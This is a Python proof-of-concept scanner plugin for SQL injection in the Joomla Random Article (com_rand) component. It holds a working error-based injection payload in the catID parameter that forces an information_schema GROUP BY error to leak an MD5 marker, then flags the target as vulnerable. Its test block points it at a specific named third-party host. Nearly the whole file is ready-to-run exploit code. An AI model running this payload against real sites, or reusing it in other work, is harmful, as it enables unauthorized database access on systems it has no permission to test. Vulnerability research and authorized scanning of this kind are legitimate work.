from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : Joomla Random Article SQL Injection
From : http://cxsecurity.com/issue/WLB-2015030172
"""

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = ("index.php?option=com_rand&catID=1%27%20and(select%201%20FROM(select count(*),concat((select(select concat(MD5(3.14),0x27,0x7e)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--%20-&limit=1&style=1&view=articles&format=raw&Itemid=13")
        target_url=arg + payload
        code, head, res, _, _ = curl.curl("%s" % target_url)
        if code==200 and '4beed3b9c4a886067de0e3a094246f78' in res :
            output(target_url,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_1c57c67f275707dd80bdc18e5c1beacf.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_1c57c67f275707dd80bdc18e5c1beacf.py
#/root/github/poccreate/codesrc/exp-554.py